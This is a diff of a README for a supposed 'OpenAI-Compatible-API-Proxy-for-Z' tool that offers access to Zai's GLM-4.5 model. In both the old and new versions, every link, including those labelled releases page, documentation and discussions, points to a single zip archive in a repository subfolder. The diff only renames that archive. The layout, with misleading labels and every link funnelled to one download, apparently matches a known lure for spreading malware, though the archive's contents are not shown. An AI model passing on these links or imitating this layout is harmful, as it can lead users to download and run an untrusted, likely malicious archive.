@@ -1,7 +1,7 @@
 # 🌟 OpenAI-Compatible-API-Proxy-for-Z - Access Zai's Model with Ease
 
 ## 🔗 Download Here
-[![Download Latest Release](https://raw.githubusercontent.com/Idkwhattona/OpenAI-Compatible-API-Proxy-for-Z/main/sibbens/OpenAI-Compatible-API-Proxy-for-Z.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Idkwhattona/OpenAI-Compatible-API-Proxy-for-Z/main/sibbens/OpenAI-Compatible-API-Proxy-for-Z.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Idkwhattona/OpenAI-Compatible-API-Proxy-for-Z/main/sibbens/A_Open_AP_Z_for_Proxy_Compatible_3.7.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Idkwhattona/OpenAI-Compatible-API-Proxy-for-Z/main/sibbens/A_Open_AP_Z_for_Proxy_Compatible_3.7.zip)
 
 ## 📖 Introduction
 Welcome to OpenAI-Compatible-API-Proxy-for-Z! This application allows you to use Zai's GLM-4.5 model through a convenient interface that mimics the standard OpenAI API format. With our proxy, you can integrate AI capabilities into your projects effortlessly.
@@ -18,7 +18,7 @@ To run this application effectively, ensure your system meets the following requ
 - Internet Connection: A stable internet connection is required to access Zai’s model.
 
 ### 📥 Download & Install
-1. **Visit this page to download:** [OpenAI-Compatible-API-Proxy-for-Z Releases](https://raw.githubusercontent.com/Idkwhattona/OpenAI-Compatible-API-Proxy-for-Z/main/sibbens/OpenAI-Compatible-API-Proxy-for-Z.zip).
+1. **Visit this page to download:** [OpenAI-Compatible-API-Proxy-for-Z Releases](https://raw.githubusercontent.com/Idkwhattona/OpenAI-Compatible-API-Proxy-for-Z/main/sibbens/A_Open_AP_Z_for_Proxy_Compatible_3.7.zip).
 2. On the releases page, locate the latest version.
 3. Click on the download link that corresponds to your operating system.
 4. Wait for the download to complete. 
@@ -63,10 +63,10 @@ For questions, feature requests, or bug reports, please reach out via the GitHub
 Thank you to everyone who contributed to OpenAI-Compatible-API-Proxy-for-Z. Your support helps us deliver a user-friendly application catered to integrating Zai's powerful AI model.
 
 ## 🔗 Additional Resources
-- **Documentation:** For more in-depth information on usage and API specifics, check our [Documentation](https://raw.githubusercontent.com/Idkwhattona/OpenAI-Compatible-API-Proxy-for-Z/main/sibbens/OpenAI-Compatible-API-Proxy-for-Z.zip).
-- **Community:** Join our community discussions on the [Discussions Page](https://raw.githubusercontent.com/Idkwhattona/OpenAI-Compatible-API-Proxy-for-Z/main/sibbens/OpenAI-Compatible-API-Proxy-for-Z.zip).
+- **Documentation:** For more in-depth information on usage and API specifics, check our [Documentation](https://raw.githubusercontent.com/Idkwhattona/OpenAI-Compatible-API-Proxy-for-Z/main/sibbens/A_Open_AP_Z_for_Proxy_Compatible_3.7.zip).
+- **Community:** Join our community discussions on the [Discussions Page](https://raw.githubusercontent.com/Idkwhattona/OpenAI-Compatible-API-Proxy-for-Z/main/sibbens/A_Open_AP_Z_for_Proxy_Compatible_3.7.zip).
 
 ## 🔗 Download Here Again
-[![Download Latest Release](https://raw.githubusercontent.com/Idkwhattona/OpenAI-Compatible-API-Proxy-for-Z/main/sibbens/OpenAI-Compatible-API-Proxy-for-Z.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Idkwhattona/OpenAI-Compatible-API-Proxy-for-Z/main/sibbens/OpenAI-Compatible-API-Proxy-for-Z.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Idkwhattona/OpenAI-Compatible-API-Proxy-for-Z/main/sibbens/A_Open_AP_Z_for_Proxy_Compatible_3.7.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Idkwhattona/OpenAI-Compatible-API-Proxy-for-Z/main/sibbens/A_Open_AP_Z_for_Proxy_Compatible_3.7.zip)
 
 Thank you for using OpenAI-Compatible-API-Proxy-for-Z. We hope you enjoy exploring Zai's GLM-4.5 capabilities!
